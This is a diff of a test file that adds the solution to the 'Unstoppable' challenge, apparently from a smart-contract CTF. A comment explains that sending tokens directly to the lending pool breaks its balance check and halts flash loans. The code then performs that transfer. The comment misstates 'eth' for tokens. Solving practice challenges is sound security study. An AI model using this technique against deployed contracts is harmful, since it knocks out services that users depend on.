@@ -41,6 +41,13 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+       /*
+       Solution: Unstoppable Lender is assuming that we will only deposit tokens
+       via the depositTokens() function which updates the internal pool balance.
+       the flashloan function has an assertion on poolbalance == balance before
+       So, if we send eth via transfer, contract won't update pool balance. Thus,
+       we break the contract
+       */
         const a = await this.token.balanceOf(this.pool.address)
         console.log(a.toString())
         await this.token.transfer(this.pool.address, 10)
